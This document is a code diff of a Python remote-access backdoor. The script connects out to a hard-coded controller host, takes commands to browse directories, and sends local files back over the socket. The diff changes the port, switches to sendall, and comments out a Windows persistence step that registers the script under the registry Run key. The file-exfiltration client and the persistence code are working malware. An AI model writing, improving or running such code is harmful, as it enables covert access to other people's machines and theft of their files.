@@ -2,8 +2,7 @@
 import socket
 import time
 import os
-from platform import platform
-import winreg
+# import winreg
 
 
 def connect_server():
@@ -12,7 +11,7 @@ def connect_server():
 
     while not connected:
         try:
-            s.connect((host, port))
+            s.connect((HOST, PORT))
             connected = True
             print("Connected.")
         except socket.error:
@@ -49,20 +48,22 @@ def file_transfer(file_name):
             data = f.read(4096)
             if not data:
                 break
-            s.send(data)
+            s.sendall(data)
         f.close()
         time.sleep(0.8)
-        s.send(bytes("EOFX", "UTF-8"))
+        s.sendall(bytes("EOFX", "UTF-8"))
         time.sleep(0.8)
 
         return "File transfered."
     except:
+        s.sendall(bytes("EOFX", "UTF-8"))
+        time.sleep(0.8)
         return "Failed to transfer a file."
 
 
 def file_browser():
 
-    s.send(bytes(os.getcwd(), "UTF-8"))
+    s.sendall(bytes(os.getcwd(), "UTF-8"))
 
     while True:
         cmd = s.recv(4096)
@@ -71,20 +72,20 @@ def file_browser():
 
         if cmd[0] == 'ls':
             asd = ls(cmd)
-            s.send(bytes(asd, "UTF-8"))
+            s.sendall(bytes(asd, "UTF-8"))
         elif cmd[0] == 'cd':
             asd = cd(cmd)
-            s.send(bytes(asd, "UTF-8"))
+            s.sendall(bytes(asd, "UTF-8"))
         elif cmd[0] == 'cp':
             asd = file_transfer(cmd)
-            s.send(bytes(asd, "UTF-8"))
+            s.sendall(bytes(asd, "UTF-8"))
         elif cmd[0] == 'pwd':
             asd = os.getcwd()
-            s.send(bytes(asd, "UTF-8"))
+            s.sendall(bytes(asd, "UTF-8"))
         elif cmd[0] == 'exit':
             break
         else:
-            s.send(bytes("Command not found.", "UTF-8"))
+            s.sendall(bytes("Command not found.", "UTF-8"))
 
 
 def main():
@@ -103,15 +104,14 @@ def main():
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = "roll"
-port = 1234
+HOST = "roll"
+PORT = 2222
 
 if __name__ == "__main__":
-    if platform().startswith("Windows"):
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                             'Software\Microsoft\Windows\CurrentVersion\Run',
-                             0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'ptest', 0, winreg.REG_SZ,
-                          "C:\python34\Scripts\main.py")
-        key.Close()
+    # key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+    #                      'Software\Microsoft\Windows\CurrentVersion\Run',
+    #                      0, winreg.KEY_SET_VALUE)
+    # winreg.SetValueEx(key, 'ptest', 0, winreg.REG_SZ,
+    #                   "C:\Windows\System32\main.py")
+    # key.Close()
     main()
